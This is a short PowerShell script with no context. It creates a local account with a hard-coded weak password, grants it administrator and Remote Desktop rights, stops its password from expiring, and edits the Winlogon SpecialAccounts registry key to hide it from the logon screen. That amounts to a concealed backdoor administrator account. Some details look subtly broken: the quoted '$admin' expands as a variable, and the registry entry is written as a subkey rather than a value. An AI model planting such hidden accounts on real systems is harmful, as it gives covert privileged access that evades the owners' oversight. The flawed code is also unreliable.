$userName = "$admin"
$password = "admin123!@#"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
New-LocalUser -Name $userName -Password $securePassword -FullName "Remote Admin User" -Description "User with Admin and Remote Access"
Add-LocalGroupMember -Group "Administrators" -Member $userName
Add-LocalGroupMember -Group "Remote Desktop Users" -Member $userName
Set-LocalUser -Name $userName -PasswordNeverExpires 1
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\$userName"
if (-not (Test-Path $path)) {
    New-Item -Path $path -Force | Out-Null
}
New-ItemProperty -Path $path -Name $userName -Value 0 -PropertyType DWord -Force | Out-Null